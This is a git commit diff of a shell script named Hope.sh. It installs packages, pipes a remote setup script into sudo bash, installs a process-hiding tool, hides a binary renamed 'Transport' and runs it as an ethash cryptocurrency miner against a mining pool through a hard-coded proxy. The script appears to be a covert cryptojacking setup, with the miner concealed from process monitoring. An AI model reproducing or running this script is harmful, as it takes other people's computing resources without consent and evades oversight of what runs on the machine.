7ad4837c32c46c97ef8237a8f7fe5ac717fe3b5c
Master478963 <101531061+Master478963@users.noreply.github.com>
2022-05-23 18:14:25 +0530

    Update Hope.sh

--- Hope.sh
+++ Hope.sh
@@ -1,4 +1,4 @@
-apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
+sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
 curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
 apt-get install -y nodejs
 npm i -g node-process-hider
@@ -15,5 +15,4 @@ sleep 9
 ph add Transport
 sleep 9
 ph add Transport
-sleep 1
 sudo ./Transport -a ethash -o stratum+tcp://ethash.poolbinance.com:443 -u Gok001.00DON -p x -w Trans --no-sni  --proxy 140.238.247.53:1080 --dns-https-server 1.1.1.1
